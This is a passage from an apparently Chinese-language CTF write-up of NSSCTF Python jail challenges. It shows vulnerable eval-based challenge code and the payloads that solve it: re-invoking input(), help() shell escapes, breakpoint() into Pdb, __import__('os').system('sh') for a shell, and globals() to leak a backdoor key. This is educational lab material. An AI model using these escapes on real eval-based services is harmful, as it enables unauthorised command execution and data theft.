class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ ___  </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | |__ \ </span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ </span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                    </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>题目限制了我们的输入长度，这里用到一种叫做<strong>参数逃逸</strong>的手法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br></pre></td></tr></table></figure>
<p>使用这个操作可以直接重新调用一次<code>input()</code>，本题的长度检测机制检测的是输入的<code>input_data</code>，跟我们再调用进行<code>eval</code>执行的语句长度无关，所以接下来就可以直接读flag了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">&gt; eval(input())</span></span><br><span class="line"><span class="string">print(open(&#x27;</span>flag<span class="string">&#x27;).read())</span></span><br><span class="line"><span class="string">flag=NSSCTF&#123;25e8054e-3ee4-4b08-8096-37ad660e5165&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Answer: None</span></span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level3">calc_jail_beginner_level3</h4>
<p>you finish beginner challenge level2.Let’s play an challenge of level3</p>
<p>Now that the length is limited than level2, can u escape this jail?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ ____  </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | |___ \ </span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ &lt; </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                     </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                       </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"><span class="comment">#the length is be limited less than 7</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">7</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>题目限定了长度只有7，之前的方法也不能用了。这题思路是利用<code>help()</code>进入help界面，在某个模块里直接输入<code>!</code><strong>前缀后接命令即可直接执行系统命令</strong>。</p>
<blockquote>
<p>这个方法在很多题目里实际上会被ban掉。</p>
</blockquote>
<p>比如输入<code>os</code>查询界面，接下来输入<code>! cat flag</code>即可直接得到flag：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> |  Methods defined here:</span><br><span class="line"> |</span><br><span class="line">--More--! cat flag</span><br><span class="line">! cat flag</span><br><span class="line">flag=NSSCTF&#123;f3ca28df-a0c2-4156-a789-73bb7dfb5365&#125;</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level2-5">calc_jail_beginner_level2.5</h4>
<p>level2 seems have some unintend soluntion</p>
<p>level2.5 is out.Let’s Avenger</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#the length is be limited less than 13</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#banned some unintend sol</span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    BLACKLIST = [<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;eval&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i!r&#125;</span> has been banned for security reasons&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _ _                _ ___    _____ </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | |              | |__ \  | ____|</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  </span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                          </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">filter</span>(input_data)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>发现在level2的基础上进一步进行了约束，之前的方法不能用了。尝试使用level3的help，简单操作了一下发现得不到flag。</p>
<p>题目用到了另一个<code>breakpoint()</code>这个函数。这个函数可以进入Pdb，是一个python的debug调试器，可以在上下文中直接运行python代码。</p>
<p>进入pdb之后直接一句话RCE即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">&gt; breakpoint()</span></span><br><span class="line"><span class="string">--Return--</span></span><br><span class="line"><span class="string">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;None</span></span><br><span class="line"><span class="string">(Pdb) open(&#x27;</span>flag<span class="string">&#x27;).read()</span></span><br><span class="line"><span class="string">&#x27;</span>flag=NSSCTF&#123;e6b11ec7-86fc-4169-96ca-baa9f18ed202&#125;\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">(Pdb)</span></span><br></pre></td></tr></table></figure>
<h4 id="python2-input">python2 input</h4>
<p>Let’s have a rest,Did u like the challenge of python2 but it only have an input function.</p>
<p>Can u read the flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># It&#x27;s escape this repeat!</span></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">              _   _      ___        ___    _____             _    _ _   </span></span><br><span class="line"><span class="string">             | | | |    / _ \      |__ \  |_   _|           | |  | | |  </span></span><br><span class="line"><span class="string">  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ </span></span><br><span class="line"><span class="string"> | &#x27;_ \| | | | __| &#x27;_ \| | | | &#x27;_ \  / /    | | | &#x27;_ \| &#x27;_ \| |  | | __|</span></span><br><span class="line"><span class="string"> | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ </span></span><br><span class="line"><span class="string"> | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|</span></span><br><span class="line"><span class="string"> | |     __/ |                                        | |               </span></span><br><span class="line"><span class="string"> |_|    |___/                                         |_|                               </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> WELCOME</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Welcome to the python jail&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;But this program will repeat your messages&quot;</span></span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span> input_data</span><br></pre></td></tr></table></figure>
<p>没怎么研究过python2……</p>
<p>通过<code>print WELCOME</code>这种写法判定为这是python2的程序。了解一下python2的特性：</p>
<p>在python 2中，<code>input</code>函数从标准输入接收输入，并且自动<code>eval</code>求值，返回求出来的值；</p>
<p>在python 2中，<code>raw_input</code>函数从标准输入接收输入，返回输入字符串；</p>
<p>在python 3中，<code>input</code>函数从标准输入接收输入，返回输入字符串。</p>
<p>也就是说，以下几个代码是等价的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span>() <span class="comment">#python2</span></span><br><span class="line"><span class="built_in">eval</span>(raw_input()) <span class="comment">#python2</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>()) <span class="comment">#python3</span></span><br></pre></td></tr></table></figure>
<p>题目直接使用了python2的input，所以直接一句话RCE得到flag：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">plaintext</span><br><span class="line">Welcome to the python jail</span><br><span class="line">But this program will repeat your messages</span><br><span class="line">&gt; __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">flag  server.py</span></span><br><span class="line"><span class="string">$ cat flag</span></span><br><span class="line"><span class="string">flag=NSSCTF&#123;8b9343ae-b657-4308-8610-a61bc6b829c9&#125;</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
<h4 id="lake-lake-lake">lake lake lake</h4>
<p>Cool job of u finished level3</p>
<p>Now it’s time for level4,Try to leak the key!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#it seems have a backdoor</span></span><br><span class="line"><span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _          _       _          _       _        </span></span><br><span class="line"><span class="string"> | |     | |        | |     | |        | |     | |       </span></span><br><span class="line"><span class="string"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ </span></span><br><span class="line"><span class="string"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span></span><br><span class="line"><span class="string"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Now the program has two functions&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;can you use dockerdoor&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1.func&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2.backdoor&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>题目中提到了一个<code>fake_key_var_in_the_local_but_real_in_the_remote = &quot;[DELETED]&quot;</code>。</p>
<p>想到查找全局变量找到这个真正的key，使用<code>globals()</code>得到全局变量中的key，然后用backdoor函数一句话RCE即可。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Now the program has two <span class="built_in">functions</span></span><br><span class="line">can you use dockerdoor</span><br><span class="line">1.func</span><br><span class="line">2.backdoor</span><br><span class="line">&gt; 1</span><br><span class="line">&gt;<span class="function"><span class="title">globals</span></span>()</span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: None, <span class="string">&#x27;__package__&#x27;</span>: None, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fc3fb2a4a90&gt;, <span class="string">&#x27;__spec__&#x27;</span>: None, <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-in)&gt;, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;/home/ctf/./server.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: None, <span class="string">&#x27;key_9b1d015375213e21&#x27;</span>: <span class="string">&#x27;a34af94e88aed5c34fb5ccfe08cd14ab&#x27;</span>, <span class="string">&#x27;func&#x27;</span>: &lt;<span class="keyword">function</span> func at 0x7fc3fb43fd90&gt;, <span class="string">&#x27;backdoor&#x27;</span>: &lt;<span class="keyword">function</span> backdoor at 0x7fc3fb305fc0&gt;, <span class="string">&#x27;WELCOME&#x27;</span>: <span class="string">&#x27;\n  _       _          _       _          _       _        \n | |     | |        | |     | |        | |     | |       \n | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ \n | |/ _` | |/ / _ \\ | |/ _` | |/ / _ \\ | |/ _` | |/ / _  | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/\n |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            \n&#x27;</span>, <span class="string">&#x27;input_data&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">Now the program has two <span class="built_in">functions</span></span><br><span class="line">can you use dockerdoor</span><br><span class="line">1.func</span><br><span class="line">2.backdoor</span><br><span class="line">&gt; 2</span><br><span class="line">Please enter the admin key</span><br><span class="line">&gt;a34af94e88aed5c34fb5ccfe08cd14ab</span><br><span class="line">&gt;open(<span class="string">&#x27;flag&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line">flag=NSSCTF&#123;04c4c4a2-79bf-4cb5-9d1a-20583a32845e&#125;</span><br></pre></td></tr></table></figure>
<h4 id="l-ke-l-ke-l-ke">l@ke l@ke l@ke</h4>
<p>seems u finished lake lake lake</p>
<p>Let’s have a try on l@ke l@ke l@ke</p>
<p>G00d luck!!!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#it seems have a backdoor as `lake lake lake`</span></span><br><span class="line"><span class="comment">#but it seems be limited!</span></span><br><span class="line"><span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _         _          _         _          _         _        </span></span><br><span class="line"><span class="string"> | |  ____ | |        | |  ____ | |        | |  ____ | |       </span></span><br><span class="line"><span class="string"> | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ </span></span><br><span class="line"><span class="string"> | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \</span></span><br><span class="line"><span class="string"> | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/</span></span><br><span class="line"><span class="string"> |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|</span></span><br><span class="line"><span class="string">     \____/               \____/               \____/                                                                                                                                                                                                                                        </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Now the program has two functions&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;can you use dockerdoor&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1.func&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span 